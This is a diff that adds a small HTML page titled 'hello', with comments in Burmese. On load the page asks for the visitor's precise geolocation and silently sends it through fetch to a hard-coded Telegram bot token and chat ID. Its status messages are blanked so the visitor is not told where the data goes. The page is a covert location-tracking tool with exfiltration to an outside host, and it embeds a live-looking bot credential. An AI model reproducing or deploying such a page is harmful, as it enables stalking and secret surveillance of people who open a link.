@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <title>hello</title>
+</head>
+<body>
+
+    <p id="result">Location အချက်အလက်များကို စစ်ဆေးနေပါသည်...</p>
+
+    <script>
+        // **********************************************
+        // 🚨 ဤနေရာတွင် သင်၏ အချက်အလက်များကို ပြောင်းလဲပါ။
+        // **********************************************
+        const BOT_TOKEN = "7450505378:AAHCCCmNZUvaz-ybfFd2HWKgupc2eJ01y7c"; // သင့် Bot Token
+        const CHAT_ID = "1178561927";     // Location ပို့လိုသော Chat ID
+        // **********************************************
+
+        // 1. Page Load တွင် Location ကို စတင်တောင်းခံသည်
+        function getLocationAndSend() {
+            var resultElement = document.getElementById("result");
+
+            if (navigator.geolocation) {
+                // Location ခွင့်ပြုချက် Popup ကို ချက်ချင်းတောင်းခံခြင်း
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000, // 10 စက္ကန့် စောင့်မည်
+                    maximumAge: 0
+                });
+            } else {
+                resultElement.innerHTML = "Browser တွင် Geolocation ကို Support မလုပ်ပါ။";
+            }
+        }
+
+        // 2. Location ရရှိသွားပါက ဤ Function ကို ခေါ်သည်
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            var resultElement = document.getElementById("result");
+
+            resultElement.innerHTML = "hello" + 
+                                     "" +
+                                     
+                                     "";
+
+            // Location ကို Telegram Bot သို့ ပို့ရန် Function ကို ခေါ်သည်
+            sendLocationToTelegram(latitude, longitude);
+        }
+
+        // 3. Error တစ်ခုခု ဖြစ်ပေါ်ပါက ဤ Function ကို ခေါ်သည်
+        function showError(error) {
+            var resultElement = document.getElementById("result");
+            let errorMessage = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = "❌ အမည်မသိ Error တစ်ခုခု ဖြစ်ပွားခဲ့ပါသည်။";
+                    break;
+            }
+            resultElement.innerHTML = errorMessage;
+        }
+
+        // 4. Telegram Bot API ကို အသုံးပြုပြီး Location ပို့သည့် Function
+        function sendLocationToTelegram(lat, lon) {
+            const resultElement = document.getElementById("result");
+            
+            // Telegram Bot API ရဲ့ sendLocation Method ကို ခေါ်ရန် URL
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        resultElement.innerHTML += "";
+                        console.log("Location sent to Telegram:", data);
+                    } else {
+                        resultElement.innerHTML += "";
+                        console.error("Telegram API Error:", data);
+                    }
+                })
+                .catch(error => {
+                    resultElement.innerHTML += `<br>❌ Network Error: ${error.message}`;
+                    console.error("Fetch Error:", error);
+                });
+        }
+
+        // Page စတင် Load လုပ်တာနဲ့ Function ကို ချက်ချင်းခေါ်ခြင်း
+        window.onload = getLocationAndSend;
+
+    </script>
+</body>
+</html>
